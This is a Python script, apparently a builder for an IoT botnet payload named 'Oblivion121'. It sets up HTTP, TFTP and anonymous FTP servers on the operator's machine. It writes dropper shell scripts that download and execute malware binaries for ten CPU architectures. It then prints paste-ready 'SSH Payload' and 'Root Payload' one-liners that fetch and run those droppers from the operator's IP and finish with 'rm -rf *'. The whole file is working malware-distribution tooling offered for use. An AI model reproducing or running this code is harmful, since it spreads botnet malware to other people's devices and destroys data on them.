import subprocess, sys, urllib
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "cp"
bin_prefix = "Oblivion121."
bin_directory = "bins"
archs = ["x86",               #1
"mips",                       #2
"mpsl",                       #3
"arm4",                       #4
"arm5",                       #5
"arm6",                       #6
"arm7",                       #7
"ppc",                        #8
"m68k",                       #9
"sh4"]                        #10
def run(cmd):
    subprocess.call(cmd, shell=True)
print("\x1b[95m Building Your Oblivion Payload Please Wait....")
print(" ")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
    socket_type             = dgram
    protocol                = udp
    wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')  
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("\x1b[90mCreating .sh Bins...")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/tOblivion121.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tOblivion121.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tOblivion121.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/tOblivion1212.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tOblivion1212.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tOblivion1212.sh')
run('echo "#!/bin/bash" > /var/www/html/Oblivion121.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/tOblivion1212.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/tOblivion1212.sh')
run('echo "#!/bin/bash" > /var/ftp/Oblivion1211.sh')
run('echo "ulimit -n 1024" >> /var/ftp/Oblivion1211.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/Oblivion1211.sh')
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+i+'" >> /var/www/html/Oblivion121.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+i+'" >> /var/ftp/Oblivion1211.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+i+'" >> /var/lib/tftpboot/tOblivion121.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+i+'" >> /var/lib/tftpboot/tOblivion1212.sh')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
print("\x1b[95mSSH Payload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/Oblivion121.sh; curl -O http://" + ip + "/Oblivion121.sh; chmod 777 Oblivion121.sh; sh Oblivion121.sh; tftp " + ip + " -c get tOblivion121.sh; chmod 777 tOblivion121.sh; sh tOblivion121.sh; tftp -r tOblivion1212.sh -g " + ip + "; chmod 777 tOblivion1212.sh; sh tOblivion1212.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " Oblivion1211.sh Oblivion1211.sh; sh Oblivion1211.sh; rm -rf Oblivion121.sh tOblivion121.sh tOblivion1212.sh Oblivion1211.sh; rm -rf *\x1b[0m")
print("")
print("")
print("\x1b[95mRoot Payload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/Oblivion121.sh; curl -O http://" + ip + "/Oblivion121.sh; chmod 777 Oblivion121.sh; sh Oblivion121.sh; rm -rf *\x1b[0m")
print("")
raw_input("\x1b[90m Payload Built Press Any Key To Exit....")
